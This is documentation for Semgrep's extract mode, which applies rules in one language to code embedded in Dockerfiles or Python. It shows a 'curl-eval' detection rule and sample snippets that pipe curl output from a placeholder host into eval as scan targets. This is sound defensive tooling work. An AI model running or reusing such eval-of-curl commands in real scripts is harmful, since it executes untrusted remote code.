---
id: extract-mode
append_help_link: true
description: "This article explains the extract mode, which allows for easier handling of files containing more than one language."
---

# Extract mode

## Introduction

Extract mode enables you to run existing rules on subsections of files where the rule language is different than the language of the file. For example, running a Javascript rule on code contained inside of script tags in an HTML document.

## Example of extract mode

Without extract mode, writing rules to validate template, Markdown or configuration files which contain code in another language can be burdensome and require significant rule duplication.

Let's take the following Bash rule as an example (a simplified version of the [`curl-eval`](https://github.com/returntocorp/semgrep-rules/blob/release/bash/curl/security/curl-eval.yaml) rule from the Semgrep Registry):

```yaml
rules:
  - id: curl-eval
    severity: WARNING
    languages:
      - bash
    message: Evaluating data from a `curl` command is unsafe.
    mode: taint
    pattern-sources:
      - pattern: |
          $(curl ...)
      - pattern: |
          `curl ...`
    pattern-sinks:
      - pattern: eval ...
```

Usually, Semgrep uses this rule only against Bash files. However, a project might contain Dockerfiles or Python scripts that invoke Bash commands&mdash;without an extract mode rule, Semgrep does **not** run any Bash rules against commands contained in files of different languages.

However, with extract mode, you can provide Semgrep with instructions on how to extract any Bash commands used in a Docker `RUN` instruction or as an argument to Python's `os.system` standard library function.

```yaml
rules:
  - id: extract-docker-run-to-bash
    mode: extract
    languages:
      - dockerfile
    pattern: RUN $...CMD
    extract: $...CMD
    dest-language: bash
  - id: extract-python-os-system-to-bash
    mode: extract
    languages:
      - python
    pattern: os.system("$CMD")
    extract: $CMD
    dest-language: bash
```

By adding the extract mode rules as shown in the previous code snippet, Semgrep matches Bash code contained in the following Python file and reports the contained Bash as matching against the `curl-eval` rule.

```python
from os import system

if system('eval `curl -s "http://www.very-secure-website.net"`'):
    print("Command failed!")
else:
    print("Success")
```

Likewise, if a query included a Dockerfile with an equivalent Bash command, Semgrep reports the contained Bash as matching against the `curl-eval` rule. See the following Dockerfile example that contains a Bash command:

```dockerfile
FROM fedora
RUN dnf install -y unzip zip curl which
RUN eval `curl -s "http://www.very-secure-website.net"`
```

## Extract mode rule schema

Extract mode rules **require** the following [usual Semgrep rule keys](../../writing-rules/rule-syntax/#required):
  - `id`
  - `languages`
  - One of `pattern`, `patterns`, `pattern-either`, or `pattern-regex`

Extract mode rules **also require** two additional fields:
  - `extract`
  - `dest-language`

Extract mode has one **optional** field:
  - `reduce`

The fields specific to extract mode are further explained in the sections below.

### `extract`

The `extract` key is required in extract mode. The value must be a metavariable appearing in your pattern(s). Semgrep uses the code bound to the metavariable for subsequent queries of non-extract mode rules targeting `dest-language`.

### `dest-language`

The `dest-language` key is required in extract mode. The value must be a [language tag](../../writing-rules/rule-syntax/#language-extensions-and-tags) other than `generic`.

### `reduce`

The `reduce` key is optional in extract mode. The value of this key specifies a method to combine the ranges extracted by a single rule within a file.

The value of `reduce` key must be one of the following:
<dl>
    <dt><code>separate</code></dt>
    <dd><p>Treat all matched ranges as separate units for subsequent queries. This is the <b>default</b> value.</p></dd>
    <dt><code>concat</code></dt>
    <dd><p>Concatenate all matched ranges together and treat this result as a single unit for subsequent queries.</p></dd>
</dl>


## Limitations of extract mode

Currently, extract mode does not support additional processing for the extracted text, such as unescaping strings, which might be useful for some applications like Jupyter Notebooks.

While extract mode can help to enable rules which try and track taint across a language boundary within a file, taint rules cannot have a source and sink split across the original file and extracted text.
